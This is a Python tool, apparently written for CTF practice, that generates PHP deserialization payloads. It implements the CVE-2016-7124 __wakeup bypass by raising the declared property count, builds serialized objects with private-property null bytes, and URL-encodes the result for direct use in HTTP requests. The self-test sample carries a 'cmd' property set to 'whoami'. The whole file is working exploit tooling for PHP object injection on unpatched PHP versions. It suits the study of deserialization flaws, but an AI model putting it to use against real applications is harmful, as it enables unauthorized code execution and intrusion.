# -*- coding: utf-8 -*-
"""PHP 反序列化 __wakeup 绕过 & 序列化串工具(补充题型: Web/PHP反序列化)

用途:
    1) CVE-2016-7124 式绕过: 属性个数改成大于实际个数, 跳过 __wakeup()
       (PHP5 < 5.6.25 / PHP7 < 7.0.10)
    2) 私有属性序列化串生成: 生成 \0类名\0属性名 正确格式
    3) URL 编码输出, 方便直接放进请求

用法:
    python wakeup_bypass.py                          # 自测
    python wakeup_bypass.py -s 'O:8:"Demo":2:{...}'  # 属性数改成 3+ 绕过
    python wakeup_bypass.py --class Demo --props cmd=whoami name=abc  # 生成序列化串
"""
from __future__ import annotations

import argparse
import re
import sys


def bump_property_count(s: str, new_count: int | None = None) -> str:
    """O:8:"Demo":2:{...} -> O:8:"Demo":9:{...} (个数大于实际即绕过 __wakeup)。"""
    def repl(m):
        n = new_count if new_count is not None else int(m.group(3)) + 1
        return f'O:{m.group(1)}:"{m.group(2)}":{n}:'
    out = re.sub(r'O:(\d+):"([^"]+)":(\d+):', repl, s, count=1)
    if out == s:
        raise ValueError('不是对象序列化串: 未找到 O:len:"Class":N:{ 模式')
    return out


def make_serialized(class_name: str, props: dict, private: bool = False) -> str:
    """构造对象序列化串。private=True 时属性名按私有格式 \\0类\\0属性。
    注意 PHP 的 s:N 按字节数计长, 非 ASCII 必须 len(encode('utf-8'))。"""
    def blen(s: str) -> int:
        return len(s.encode('utf-8'))
    if private:
        inner = ''.join(
            f's:{blen(chr(0) + class_name + chr(0) + k)}:"' + chr(0) + f'{class_name}{chr(0)}{k}";'
            f's:{blen(str(v))}:"{v}";'
            for k, v in props.items()
        )
    else:
        inner = ''.join(
            f's:{blen(k)}:"{k}";s:{blen(str(v))}:"{v}";'
            for k, v in props.items()
        )
    return f'O:{blen(class_name)}:"{class_name}":{len(props)}:{{{inner}}}'


def url_encode_all(s: str) -> str:
    """全部字符 URL 编码(私有属性 \\0 必须编码成 %00)。"""
    return ''.join(f'%{ord(c):02X}' for c in s)


def main():
    ap = argparse.ArgumentParser(description='PHP 反序列化 __wakeup 绕过/串生成')
    ap.add_argument('-s', '--serialized', help='已有的序列化串')
    ap.add_argument('-n', '--count', type=int, help='新属性个数(默认=原+1)')
    ap.add_argument('--class', dest='cls', help='生成串: 类名')
    ap.add_argument('--props', nargs='+', default=[], help='生成串: 属性=值')
    ap.add_argument('--private', action='store_true', help='按私有属性生成')
    ap.add_argument('--url', action='store_true', help='输出 URL 编码')
    args = ap.parse_args()

    if args.serialized:
        out = bump_property_count(args.serialized, args.count)
        print(out)
        if args.url:
            print(url_encode_all(out))
    elif args.cls:
        props = {}
        for kv in args.props:
            k, v = kv.split('=', 1)
            props[k] = v
        out = make_serialized(args.cls, props, private=args.private)
        print(out)
        if args.url:
            print(url_encode_all(out))
    else:
        # 自测
        ok = True
        # DemoClass 是 9 个字符, 长度字段必须是 O:9(原版 O:8 是错样例, 会教错人)
        sample = 'O:9:"DemoClass":2:{s:3:"cmd";s:6:"whoami";s:4:"name";s:3:"abc";}'
        bumped = bump_property_count(sample)
        good = ':3:{' in bumped and bumped.startswith('O:9:"DemoClass":3:')
        ok &= good
        print(f"[{'OK' if good else 'FAIL'}] wakeup绕过: {bumped}")
        ser = make_serialized('Demo', {'cmd': 'whoami'}, private=True)
        good2 = ser.startswith('O:4:"Demo":1:{s:') and chr(0) in ser
        ok &= good2
        print(f"[{'OK' if good2 else 'FAIL'}] 私有属性串: {ser!r}")
        enc = url_encode_all(ser)
        good3 = '%00' in enc
        ok &= good3
        print(f"[{'OK' if good3 else 'FAIL'}] URL编码: {enc}")
        sys.exit(0 if ok else 1)


if __name__ == '__main__':
    main()
